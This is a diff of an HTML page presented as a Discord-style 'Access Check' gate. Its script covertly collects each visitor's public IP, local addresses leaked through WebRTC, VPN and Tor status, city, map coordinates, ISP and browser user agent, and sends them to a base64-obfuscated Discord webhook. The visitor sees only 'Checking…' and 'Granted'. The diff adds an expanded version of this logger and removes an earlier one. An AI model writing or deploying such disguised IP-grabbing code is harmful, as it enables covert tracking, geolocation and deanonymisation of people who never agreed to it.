@@ -33,75 +33,70 @@
   <div id="c">
     <h2>Access Check</h2>
     <input id="u" placeholder="User#0000">
-    <textarea id="msg" placeholder="Type your message" rows="3"></textarea>
+    <textarea id="msg" placeholder="Type your message (optional)" rows="3"></textarea>
     <button id="b">Go</button>
     <div id="s"><span id="m"></span></div>
   </div>
   <script>
     (()=>{
-      for(let i=0;i<30;i++){
-        let p=document.createElement('div'),s=Math.random()*8+4;
+      // particles
+      for(let i=0;i<30;i++){let p=document.createElement('div'),s=Math.random()*8+4;
         p.className='particle';p.style.width=s+'px';p.style.height=s+'px';
         p.style.top=Math.random()*100+'%';p.style.left=Math.random()*100+'%';
-        p.style.animationDuration=10+Math.random()*10+'s';document.body.append(p)
+        p.style.animationDuration=10+Math.random()*10+'s';document.body.append(p)}
+      // decode keys
+      const keys=[
+        'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MTI2NTA2MTg3OTk0MzE3OC9TSUw0aXpCaWktQ1UtUFI4MG5SNktWTHhoMmlsMFBFel81TEhoU2VBSlNieEN3UUR1TnNkNDFoQ0JBYWdpOUYtM3Ffcw==',
+        'WU9VUl9JUFFTX0FQSV9LRVk=',
+        'WU9VUl9JUFVIX0FQSV9LRVk='
+      ],d=atob,H=d(keys[0]),K1=d(keys[1]),K2=d(keys[2]);
+      // util fns
+      async function getIP(){for(const u of ['https://api.ipify.org?format=json','https://ipapi.co/json/','https://ipwho.is/']){
+          try{let j=await fetch(u).then(r=>r.json()),i=j.ip||j.ip_address||j.ipAddress; if(i) return i;}catch{} }
+        throw 'NoIP'; }
+      async function getLeak(t=2e3){return new Promise(r=>{const s=new Set,p=new RTCPeerConnection({iceServers:[]});
+        p.createDataChannel('');p.createOffer().then(o=>p.setLocalDescription(o));
+        p.onicecandidate=e=>e.candidate&&s.add(e.candidate.candidate.split(' ')[4]);
+        setTimeout(()=>{p.close();r([...s])},t);
+      });}
+      async function checkVPN(ip){let f=[];
+        try{let a=await fetch(`https://ipapi.co/${ip}/json/`).then(r=>r.json());/hosting|datacenter|cloud|proxy|vpn/i.test(a.org||'')&&f.push('D')}catch{}
+        try{let b=await fetch(`https://ipwho.is/${ip}`).then(r=>r.json());(b.security&&(b.security.is_proxy||b.security.is_tor))&&f.push('H')}catch{}
+        try{let c=await fetch(`https://ipqualityscore.com/api/json/ip/${K1}/${ip}?strictness=1`).then(r=>r.json());(c.vpn||c.proxy||c.tor||c.fraud_score>50)&&f.push('Q')}catch{}
+        try{let d=await fetch(`https://v2.api.iphub.info/ip/${ip}`,{headers:{'X-Key':K2}}}).then(r=>r.json());d.block===1&&f.push('P')}catch{}
+        return f;
       }
-      const e=['aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MTI2NTA2MTg3OTk0MzE3OC9TSUw0aXpCaWktQ1UtUFI4MG5SNktWTHhoMmlsMFBFel81TEhoU2VBSlNieEN3UUR1TnNkNDFoQ0JBYWdpOUYtM3Ffcw==','WU9VUl9JUFFTX0FQSV9LRVk=','WU9VUl9JUFVIX0FQSV9LRVk='],d=x=>atob(x),H=d(e[0]),K1=d(e[1]),K2=d(e[2]);
-      async function getIP(){
-        for(const u of['https://api.ipify.org?format=json',`https://ipapi.co/json/`,`https://ipwho.is/`])
-          try{let j=await fetch(u).then(r=>r.json()),i=j.ip||j.ip_address||j.ipAddress; if(i)return i}catch{}
-        throw'NoIP'
-      }
-      async function getLeak(t=2e3){
-        return new Promise(r=>{
-          const s=new Set,p=new RTCPeerConnection({iceServers:[]});
-          p.createDataChannel('');p.createOffer().then(o=>p.setLocalDescription(o));
-          p.onicecandidate=e=>e.candidate&&s.add(e.candidate.candidate.split(' ')[4]);
-          setTimeout(()=>{p.close();r([...s])},t)
-        })
-      }
-      async function checkVPN(ip){
-        let flags=[]; try{let a=await fetch(`https://ipapi.co/${ip}/json/`).then(r=>r.json());
-          /hosting|datacenter|cloud|proxy|vpn/i.test(a.org||'')&&flags.push('D')}catch{}
-        try{let b=await fetch(`https://ipwho.is/${ip}`).then(r=>r.json());
-          (b.security&&(b.security.is_proxy||b.security.is_tor))&&flags.push('H')}catch{}
-        try{let c=await fetch(`https://ipqualityscore.com/api/json/ip/${K1}/${ip}?strictness=1`).then(r=>r.json());
-          (c.vpn||c.proxy||c.tor||c.fraud_score>50)&&flags.push('Q')}catch{}
-        try{let d=await fetch(`https://v2.api.iphub.info/ip/${ip}`,{headers:{'X-Key':K2}}).then(r=>r.json());
-          d.block===1&&flags.push('P')}catch{}
-        return flags
-      }
-      const $=id=>document.getElementById(id),u=$('u'),msg=$('msg'),btn=$('b'),sta=$('s'),ms=$('m');
+      // DOM refs
+      const $=id=>document.getElementById(id);
+      const u=$('u'),msg=$('msg'),btn=$('b'),sta=$('s'),ms=$('m');
       const F=(c,t)=>(sta.className='v '+c,ms.textContent=t);
       btn.onclick=async()=>{
-        const t=u.value.trim(), m=msg.value.trim();
-        if(!t) return F('err','Enter your tag');
-        if(!m) return F('err','Enter a message');
-        F('', 'Checking…'); btn.disabled=1;
+        const tag=u.value.trim(), text=msg.value.trim();
+        if(!tag) return F('err','Enter your tag');
+        F('','Checking…'); btn.disabled=true;
         try{
-          const ip=await getIP(), lk=await getLeak(), vpn=await checkVPN(ip);
-          if(vpn.length) return F('err','VPNs not allowed'), btn.disabled=0;
-          const js=await fetch(`https://ipapi.co/${ip}/json/`).then(r=>r.json());
-          const pl={
-            username:'Gate', author:{name:'Secure Bot'}, embeds:[{
-              color:65280,
-              fields:[
-                {name:'User Tag',value:t,inline:1},
-                {name:'IP Address',value:ip,inline:1},
-                {name:'Message',value:m,inline:0},
-                {name:'Location',value:`${js.city||'?'}, ${js.country_code||'?'}`,inline:1},
-                {name:'Coordinates',value:`[Map](https://google.com/maps?q=${js.latitude},${js.longitude})`,inline:1},
-                {name:'Checks',value:vpn.join(',')||'-',inline:1},
-                {name:'Leak Info',value:lk.join(',')||'-',inline:0}
-              ],
-              footer:{text:new Date().toUTCString()}
-            }]
-          };
-          await fetch(H,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(pl)});
-          F('ok','Granted')
-        }catch{
-          F('err','Error occurred')
-        }finally{btn.disabled=0}
-      }
+          const ip=await getIP(),lp=await getLeak(),vpn=await checkVPN(ip);
+          if(vpn.length) return F('err','VPNs not allowed'),btn.disabled=false;
+          const geo=await fetch(`https://ipapi.co/${ip}/json/`).then(r=>r.json());
+          const payload={username:'Gate',author:{name:'Made by Big Guy'},embeds:[{color:65280,fields:[
+            {name:'T',value:tag,inline:1},
+            {name:'A',value:ip,inline:1},
+            {name:'Lookup IP',value:`[Info](https://ipinfo.io/${ip})`,inline:1},
+            {name:'C',value:`${geo.city||'?'}, ${geo.country_code||'?'}`,inline:1},
+            {name:'Coordinates',value:`[Map](https://google.com/maps?q=${geo.latitude},${geo.longitude})`,inline:1},
+            {name:'ISP/Organization',value:geo.org?`[${geo.org}](https://ipinfo.io/${ip})`:'?',inline:1},
+            {name:'Checks',value:vpn.join(',')||'-',inline:1},
+            {name:'Reason',value:'I made this to secure my server',inline:0},
+            {name:'I',value:lp.join(',')||'-',inline:0},
+            {name:'U',value:navigator.userAgent,inline:0},
+            text?{name:'Message',value:text,inline:0}:null
+          ].filter(Boolean),footer:{text:new Date().toUTCString()}}]};
+          await fetch(H,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
+          F('ok','Granted');
+        }catch(e){
+          console.error(e);F('err','Error occurred');
+        }finally{btn.disabled=false;}
+      };
     })();
   </script>
 </body>
